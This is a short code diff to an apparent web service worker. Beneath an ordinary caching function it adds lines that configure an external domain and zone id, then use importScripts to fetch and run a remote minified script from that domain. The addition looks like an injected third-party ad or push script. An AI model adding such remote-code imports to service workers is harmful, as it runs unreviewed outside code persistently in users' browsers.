@@ -109,3 +109,10 @@ async function networkFirst(request) {
     return new Response('Content not available', { status: 503 });
   }
 }
+
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10574378
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
